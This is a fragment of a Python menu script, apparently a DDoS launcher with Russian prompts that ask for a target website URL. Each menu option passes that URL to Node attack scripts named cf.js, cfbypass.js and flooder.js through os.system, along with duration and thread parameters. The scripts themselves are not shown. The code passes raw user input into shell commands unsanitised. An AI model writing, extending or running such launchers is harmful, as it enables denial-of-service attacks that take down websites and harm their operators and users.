...
if ddos == "1":
    ...
    os.system(f"node cf.js {ddoscf} 30 10")
if ddos == "2":
    ddoscfbypass = input( "Введите URL сайта: " )
    os.system(f"node cfbypass.js {ddoscfbypass} 10 30")
if ddos == "3":
    ddosflooder = input( "Введите URL сайта: " )
    os.system(f"node flooder.js {ddosflooder} 30 10")
if ddos == "4":
...
if ddos == "9":
    ...
    os.system(f"node cf.js {ddoshyper} 30")
if ddos == "10":
